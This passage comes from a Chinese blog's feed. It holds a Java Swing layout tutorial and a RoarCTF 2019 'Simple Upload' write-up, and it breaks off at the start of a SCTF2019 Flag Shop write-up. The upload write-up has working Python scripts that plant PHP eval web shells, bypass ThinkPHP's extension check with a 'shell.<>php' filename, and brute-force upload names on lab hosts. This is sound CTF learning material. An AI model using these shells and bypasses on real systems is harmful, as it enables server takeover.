            <tag> 万能密码 </tag>
            
            <tag> php_mt_seed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA图形界面之三种pane布局方式</title>
      <link href="/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/"/>
      <url>/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以何种距离，用何种方式，怎样措辞，如何面对。</p></blockquote><h2 id="基于JFrame的图形界面"><a href="#基于JFrame的图形界面" class="headerlink" title="基于JFrame的图形界面"></a>基于JFrame的图形界面</h2><p>最近在学JFrame，下面用这篇博客来记一下学习笔记，主要关于的是今天学到的比较印象深刻的代码及其中的细节吧。</p><h3 id="pane面板布局及三种布局管理器"><a href="#pane面板布局及三种布局管理器" class="headerlink" title="pane面板布局及三种布局管理器"></a>pane面板布局及三种布局管理器</h3><p>这里的三种布局管理器分别为<code>流布局管理器FlowLayout</code>、<code>边布局管理器BorderLayout</code>、<code>网格布局管理器GridLayout</code></p><p>这种布局管理器怎样进行设置呢？<strong>就用下面的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.getContentPane().setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>, <span class="number">1</span>));  <span class="comment">//设置网格布局，其中为2行1列</span></span><br></pre></td></tr></table></figure><p>其余的布局设置亦相似与上面的设置方法，下面解释一下各块的意义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.getContentPane()   <span class="comment">//代表主的内容面板，这里当然也可以是向下的各级内容面板</span></span><br><span class="line">setLayout()             <span class="comment">//设置布局的函数，是panel类所具有的方法。</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>, <span class="number">1</span>)    <span class="comment">//表示创建了个两行一列的网格布局管理器。</span></span><br></pre></td></tr></table></figure><h3 id="panel套panel"><a href="#panel套panel" class="headerlink" title="panel套panel"></a>panel套panel</h3><p>这里主要用于分布复杂的软件，有上有下这样的，（目前只学了这种设置组件的位置的控制方式。<br><strong>主的contentpane套pane</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JPanel</span> <span class="variable">jp1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();           <span class="comment">//新建一个内容面板jp1</span></span><br><span class="line"><span class="built_in">this</span>.getContentPane().add(jp1);      <span class="comment">//将这个内容面板添加（add）到主的内容面板（this.getContentPane()）之内</span></span><br></pre></td></tr></table></figure><p>其他的各级的pane相互套的方式与之类似。</p><h3 id="代码与效果图"><a href="#代码与效果图" class="headerlink" title="代码与效果图"></a>代码与效果图</h3><p><strong>别的不多说了，上今天的代码与所实现的效果图</strong></p><blockquote><p>这里我把类分为了两个，懒得再合并为一个文件了，就这样吧！一个文件(类)为<code>Window1.java</code>；另一个文件(类)为<code>Window2.java</code>。</p></blockquote><blockquote><p><font color="red">这里我设置的包名为JFrameTest3如下图，(红色提示)</font></p></blockquote><p><img src="/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80//2.png"></p><p><strong>pay attention this is the first file</strong><br><code>Window1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JFrameTest3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> JFrameTest2.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Window1</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Window2</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>this is the second</strong></p><p><code>Window2.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JFrameTest3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.Button;</span><br><span class="line"><span class="keyword">import</span> java.awt.Color;</span><br><span class="line"><span class="keyword">import</span> java.awt.GridLayout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JButton;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JPanel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Window2</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Window2</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//**下面为通用开头*/</span></span><br><span class="line"><span class="built_in">super</span>(<span class="string">&quot;JFrame测试&quot;</span>);</span><br><span class="line"><span class="built_in">this</span>.setBounds(<span class="number">400</span>, <span class="number">400</span>, <span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line"><span class="built_in">this</span>.getContentPane().setBackground(Color.gray);</span><br><span class="line"><span class="built_in">this</span>.setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//**下面是网格布局（第一布局）*/</span></span><br><span class="line"><span class="built_in">this</span>.getContentPane().setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//**下面是上面的部分（即为第一步分开上面的部分）*/</span></span><br><span class="line"><span class="type">JPanel</span> <span class="variable">jp1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"><span class="built_in">this</span>.getContentPane().add(jp1);</span><br><span class="line">jp1.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line"><span class="comment">//**设置上面的左右（或者说东、西？）部分为按钮1、4*/</span></span><br><span class="line">jp1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button1&quot;</span>), <span class="string">&quot;West&quot;</span>);</span><br><span class="line">jp1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button4&quot;</span>), <span class="string">&quot;East&quot;</span>);</span><br><span class="line"><span class="comment">//**中间的部分（这里设置为一个面板，再向面板之中添加其他组件）*/</span></span><br><span class="line"><span class="type">JPanel</span> <span class="variable">jp1_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"><span class="comment">//jp1_2加入到面板1中，并且放到中间</span></span><br><span class="line">jp1.add(jp1_2, <span class="string">&quot;Center&quot;</span>);     </span><br><span class="line"><span class="comment">//设置为网格布局，并且向该面板之中添加两个按钮2、3</span></span><br><span class="line">jp1_2.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">jp1_2.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button2&quot;</span>));</span><br><span class="line">jp1_2.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button3&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//**添加下面的部分的面板*/</span></span><br><span class="line"><span class="type">JPanel</span> <span class="variable">jp2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"><span class="built_in">this</span>.getContentPane().add(jp2);</span><br><span class="line"><span class="comment">//设置为边布局管理器，并添加按钮5、10与面板的左右部分</span></span><br><span class="line">jp2.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">jp2.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button5&quot;</span>), <span class="string">&quot;West&quot;</span>);</span><br><span class="line">jp2.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is button10&quot;</span>), <span class="string">&quot;East&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//面板之中添加另一面板</span></span><br><span class="line"><span class="type">JPanel</span> <span class="variable">jp2_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"><span class="comment">//这里设置为网格布局</span></span><br><span class="line">jp2_1.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">//也放在中间</span></span><br><span class="line">jp2.add(jp2_1, <span class="string">&quot;Center&quot;</span>);</span><br><span class="line"><span class="comment">//在网格布局管理器里面添加四个按钮6、7、8、9</span></span><br><span class="line">jp2_1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is buuton6&quot;</span>));</span><br><span class="line">jp2_1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is buuton7&quot;</span>));</span><br><span class="line">jp2_1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is buuton8&quot;</span>));</span><br><span class="line">jp2_1.add(<span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;this is buuton9&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>上面的两个文件里面也都打上注释了，这里就不再继续解释了，如有人看到哪里错了或者不懂请联系我</del>，**<del>ps：我是一个负责任的男人</del>**</p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p>下面是效果图，没写多少内容，只提供参考<br><img src="/2020/11/08/JAVA%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B9%8Bpane%E5%B8%83%E5%B1%80//1.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件开发 </tag>
            
            <tag> JAVA </tag>
            
            <tag> JFrame图形界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF-2019-Simple-Upload</title>
      <link href="/2020/11/08/RoarCTF-2019-Simple-Upload/"/>
      <url>/2020/11/08/RoarCTF-2019-Simple-Upload/</url>
      
        <content type="html"><![CDATA[<blockquote><p>老歌再听</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><p>下面给出的是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">\Think\Upload</span>();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.<span class="title function_ invoke__">substr</span>(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>限制分析</strong><br>主要的限制有上传文件的后缀名限制为不能为<code>.php</code>与下面的这句关于只能上传图片的限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload-&gt;allowExts  = array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpeg&#x27;);// 设置附件上传类型</span><br></pre></td></tr></table></figure><p>但是<code>$upload-&gt;allowExts</code>并不是<code>Think\Upload</code>类的正确用法，所以<code>allowexts 后缀名限制</code>是无效的。<br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload//1.png"></p><p><strong>绕过限制</strong><br>然后怎么绕过对文件名不能为<code>.php</code>的限制呢？这里要用到的知识点为<code> think\upload 类的多文件上传</code>与<code> think\upload 类是怎么生成文件名的</code></p><p><strong>think\upload 类的多文件上传tp多文件上传</strong></p><blockquote><p><code> upload() 函数</code>不传参时为多文件上传，整个<code> $_FILES 数组</code>的文件都会上传并保存。</p></blockquote><p><strong>think\upload类是怎么生成文件名的</strong></p><p>这里主要看的是大佬的分析，<del>主要是因为我是个傻逼，这种事解释不清楚。</del>可能是因为一般都是这个吧<br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload//2.png"><br><a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Web/simple_upload/docker/html/ThinkPHP/Library/Think/Upload.class.php#L27">或者这里</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;saveName&#x27;  =&gt; array(&#x27;uniqid&#x27;, &#x27;&#x27;), //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组</span><br></pre></td></tr></table></figure><p>这里用的是<code>uniqid()</code>来生成的文件名，</p><blockquote><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。<br>故同时上传的两个文件的文件名一定不会差的很远，可爆破。</p></blockquote><h2 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h2><blockquote><p>#改自大师傅的脚本如下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;方法一&#x27;&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/index.php/home/index/upload&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">file1 = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;shell&quot;</span>,<span class="string">&quot;123&quot;</span>,)&#125;</span><br><span class="line">file2 = &#123;<span class="string">&quot;file[]&quot;</span>:(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?php @eval($_POST[penson]);&quot;</span>)&#125;  <span class="comment">#批量上传用[]</span></span><br><span class="line">r = s.post(url,files=file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = s.post(url,files=file2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = s.post(url,files=file1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;爆破&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> =<span class="string">&#x27;abcdef0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                    url = <span class="string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/Public/Uploads/2020-06-01/5ed4adac&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,j,k,x,y)</span><br><span class="line">                    <span class="built_in">print</span>(url)</span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        <span class="built_in">print</span>(url)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里上传文件利用的条件应该算是条件竞争</p><blockquote><p>think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次。</p></blockquote><p><strong>什么是条件竞争</strong></p><blockquote><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。<br>先上传一个正常文件，再上传木马文件，再上传正常文件就能绕过了。</p></blockquote><p>然后爆破上传的文件名<del>爆破这一步真的慢</del>，还是先让这个方法止步于理论之上吧。</p><p><strong>非预期解</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bea0420b-f949-4b78-8828-34c2587bc032.node3.buuoj.cn/index.php/home/index/upload/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.&lt;&gt;php&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得上传文件路径：http://bea0420b-f949-4b78-8828-34c2587bc032.node3.buuoj.cn/Public/Uploads/2020-11-08/5fa7a771de7ac.php</span></span><br></pre></td></tr></table></figure><p>还是这个比较可行一些，还快，用<code>shell.&lt;&gt;php</code>绕过对<code>.php</code>的检测，这个具体原因（就是具体的绕过原理）大师傅也没说，19年寒假期间做过一些upload，现在都是怎么绕的都快忘了，有空温习一下，众所周知，不复习不做笔记等于没学。</p><p>访问该路径直接获得了flag，以为还有命令执行呢，结果没有。<del>好j8怪啊</del><br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload//3.png"></p><blockquote><p>时间再慢一点，给我时间记住你的侧脸。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> thinkphp\upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2019-Flag-Shop</title>
      <link href="/2020/11/07/SCTF2019-Flag-Shop/"/>
      <url>/2020/11/07/SCTF2019-Flag-Shop/</url>
      
        <content type="html"><![CDATA[<blockquote><p>若为此弦声寄入一段情，北星遥远与之呼应</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="00a-提示"><a href="#00a-提示" class="headerlink" title="00a.提示"></a>00a.提示</h2><p>首先看到这个flag的价格高的离谱，估计就是伪造cookie之类的东西去买flag了。。。<br><img src="/2020/11/07/SCTF2019-Flag-Shop//1.png"><br>每次work只能赚不到十块钱，<code>1000000000000000000000000000</code>真的来点的话，估计得点到我死了。。。</p><p><strong>看<code>robots.txt</code>有提示嗷</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure><p><strong>再看<code>/filebak</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  